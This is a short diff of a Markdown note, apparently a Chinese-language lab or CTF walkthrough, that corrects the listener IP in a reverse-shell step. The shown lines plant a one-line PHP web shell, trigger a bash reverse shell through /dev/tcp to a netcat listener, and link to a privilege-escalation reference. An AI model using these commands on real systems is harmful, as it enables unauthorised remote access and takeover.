@@ -76,10 +76,9 @@ nc -lvvp 8888
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' >/var/www/html/cmd.php
-
 ```
 
-访问`http://192.168.10.13/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.10.13/8888 0>%261 "`
+访问`http://192.168.10.13/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.10.10/8888 0>%261 "`
 
 [ex提权](https://gtfobins.github.io/gtfobins/ex/)
 
